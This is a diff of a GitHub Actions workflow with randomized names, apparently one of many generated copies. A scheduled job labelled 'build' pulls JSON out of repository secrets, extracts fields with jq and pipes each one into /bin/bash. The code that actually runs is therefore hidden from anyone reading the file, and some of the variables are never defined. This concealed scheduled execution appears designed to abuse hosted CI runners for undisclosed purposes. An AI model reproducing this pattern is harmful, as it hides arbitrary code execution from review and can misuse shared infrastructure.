@@ -1,25 +1,18 @@
 name: chengpozhan7810
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
-jobs:  # 8684
+    - cron: '13 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengpozhan7810
         env:
-          nl09: ${{ secrets.nl09 }}
+          qvmv478: ${{ secrets.qvmv478 }}
         run: |
-          echo $nl09 | jq -r .plg637 | /bin/bash
-          echo $j604 | jq -r .vua92326 | /bin/bash
-          echo $q60754 | jq -r .obs528 | /bin/bash
-          echo $w38443 | jq -r .wmwe89694 | /bin/bash
-          echo $f56886 | jq -r .kiaar9128 | /bin/bash
-          echo $gejb53293 | jq -r .j83 | /bin/bash
-          echo $n81972 | jq -r .mx7591 | /bin/bash
-          echo $z3315 | jq -r .tzt7394 | /bin/bash
+          echo $qvmv478 | jq -r .cyrtv0101 | /bin/bash
+          echo $p6735 | jq -r .zgjzo6 | /bin/bash
+          echo $i29757 | jq -r .kdko30614 | /bin/bash
 
